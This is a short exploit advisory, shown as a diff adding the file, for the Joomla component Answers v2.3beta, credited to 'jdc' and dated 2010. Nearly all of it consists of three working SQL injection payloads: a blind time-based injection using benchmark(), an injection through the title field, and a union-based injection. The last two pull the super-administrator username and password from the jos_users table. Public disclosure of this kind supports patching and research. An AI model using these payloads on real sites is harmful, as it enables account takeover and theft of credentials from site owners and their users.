@@ -1,0 +1,31 @@
+# Exploit Title: Joomla Component Answers v2.3beta Multiple Vulnerabilities
+# Date: 25 May 2010
+# Author: jdc
+# Software Link: 
+http://extensions.joomla.org/extensions/communication/forum/12652
+# Version: 2.3beta
+# Tested on: PHP5, MySQL5
+
+Blind SQL Injection
+===================
+Requires: magic_quotes OFF
+
+?option=com_answers
+&task=categ
+&id=-1' union select benchmark(100000,md5(5)) as a -- '
+
+
+Title Field SQL Injection
+=========================
+title',(select concat(username,char(32),password) from jos_users where 
+gid=25 limit 1),'0','1','0','','') -- ;
+
+
+SQL Injection
+=============
+Requires: magic_quotes OFF, Joomla! debug OFF
+
+?option=com_answers
+&task=detail
+&id=-1' union select concat(username,char(32),password),2,3,4,5,6,7,8,9 
+from jos_users where gid=25 limit 1 -- '
